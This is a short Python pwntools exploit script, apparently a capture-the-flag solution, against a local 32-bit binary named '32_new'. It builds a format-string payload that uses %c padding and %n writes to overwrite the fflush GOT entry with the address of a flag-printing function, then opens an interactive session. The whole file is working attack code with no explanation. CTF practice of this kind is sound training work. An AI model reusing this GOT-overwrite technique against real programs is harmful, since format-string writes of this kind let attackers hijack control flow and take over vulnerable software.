'''
Author: Samrito
Date: 2022-02-07 18:44:03
LastEditors: Samrito
LastEditTime: 2022-02-07 19:42:23
'''
from pwn import *


def debug(argv=''):
    gdb.attach(io, argv)
    pause()


context.arch = 'i386'
context.log_level = 'debug'

io = process(argv=['./32_new'])
elf = ELF('./32_new')
fflush_got_addr = elf.got['fflush']
flag_addr = 0x0804870b

#debug('b * main')  # 48
payload = flat([
    fflush_got_addr, fflush_got_addr + 1, fflush_got_addr + 3, b'%185c',
    b'%10$n', b'%892c', b'%11$n', b'%129c', b'%12$n'
])
io.sendline(payload)

io.interactive()